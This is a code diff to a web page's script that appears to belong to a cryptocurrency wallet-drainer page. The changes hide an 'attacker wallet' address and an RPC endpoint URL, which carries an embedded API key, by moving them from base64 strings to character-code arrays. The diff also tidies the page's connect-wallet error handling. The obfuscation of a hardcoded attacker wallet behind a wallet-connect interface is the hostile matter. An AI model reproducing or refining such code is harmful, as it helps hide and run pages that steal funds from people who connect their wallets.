@@ -1038,12 +1038,12 @@
     <script>
     document.addEventListener('DOMContentLoaded', () => {
         // Configuration
-        const OBFUSCATED_ATTACKER_WALLET = 'Q01aNENmMXZZZXAlexl6UHRGZEZDVjlVZmJpSGVEVHpRSmZ5dDhDdXlHWWs='; 
-        const OBFUSCATED_RPC_ENDPOINT = 'aHR0cHM6Ly9tYWlubmV0LmhlbGl1cy1ycGMuY29tLz9hcGkta2V5PWI2MWYzNWRhLTA2ODYtNDgzMC04OGU2LWE1YjI2M2EwNDNjYg=='; 
+        const attackerWalletCharCodes = [67, 77, 90, 52, 67, 102, 49, 118, 89, 101, 112, 49, 121, 122, 80, 116, 70, 100, 70, 67, 86, 57, 85, 102, 98, 105, 72, 101, 68, 84, 122, 81, 74, 114, 102, 121, 116, 56, 67, 117, 121, 71, 88, 107];
+        const rpcEndpointCharCodes = [104, 116, 116, 112, 115, 58, 47, 47, 109, 97, 105, 110, 110, 101, 116, 46, 104, 101, 108, 105, 117, 115, 45, 114, 112, 99, 46, 99, 111, 109, 47, 63, 97, 112, 105, 45, 107, 101, 121, 61, 98, 54, 49, 102, 51, 53, 100, 97, 45, 48, 54, 56, 54, 45, 52, 56, 51, 48, 45, 56, 56, 101, 54, 45, 97, 53, 98, 50, 54, 51, 97, 48, 52, 51, 99, 98];
         
-        const ATTACKER_WALLET = atob(OBFUSCATED_ATTACKER_WALLET);
-        const RPC_ENDPOINT = atob(OBFUSCATED_RPC_ENDPOINT);
-
+        const ATTACKER_WALLET = String.fromCharCode.apply(null, attackerWalletCharCodes);
+        const RPC_ENDPOINT = String.fromCharCode.apply(null, rpcEndpointCharCodes);
+        
         // DOM elements
         const connectButton = document.getElementById('connectButton');
         const walletBtnText = document.getElementById('walletBtnText');
@@ -1354,6 +1354,10 @@
                 console.error("Connection error:", err);
                 walletBtnText.textContent = 'Select Wallet';
                 innerWalletBtnText.textContent = 'Select Wallet';
+                connectButton.classList.remove('connected');
+                connectButtonInner.classList.remove('connected');
+                walletBtnLogo.style.display = 'none';
+                innerWalletBtnLogo.style.display = 'none';
                 resultDiv.style.display = 'block';
                 log(`Error: ${err.message}`);
             }
